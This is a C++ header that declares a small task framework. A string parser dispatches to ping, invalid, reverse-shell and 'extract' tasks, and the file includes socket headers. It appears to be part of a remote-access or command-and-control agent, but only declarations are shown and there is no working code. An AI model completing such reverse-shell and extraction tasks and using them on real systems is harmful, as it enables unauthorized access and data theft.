#pragma once

#include "api.hpp"

#include <iostream>
#include <string>
#include <memory>

#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class Task
{
public:
    virtual ~Task() = default;

    /**
     * @brief Run the derived task
     * 
     */
    virtual void run() = 0;
};

class PingTask: public Task
{
public:
    void run() override;
    ~PingTask() override {};
};

class InvalidTask: public Task
{
public:
    void run() override;
    ~InvalidTask() override {};
};

class ReverseShellTask: public Task
{
private:
    static void worker();
public:
    void run() override;
    ~ReverseShellTask() override {};
};

class ExtractTask: public Task
{
public:
    void run() override;
    ~ExtractTask() override {};
};


/**
 * @brief Parse a string to a task
 * If the string is not valid, return INVALID 
 * Exemple: "ping" => Task::PING
 * @return Task 
 */
std::unique_ptr<Task> parse_task_from_string(std::string);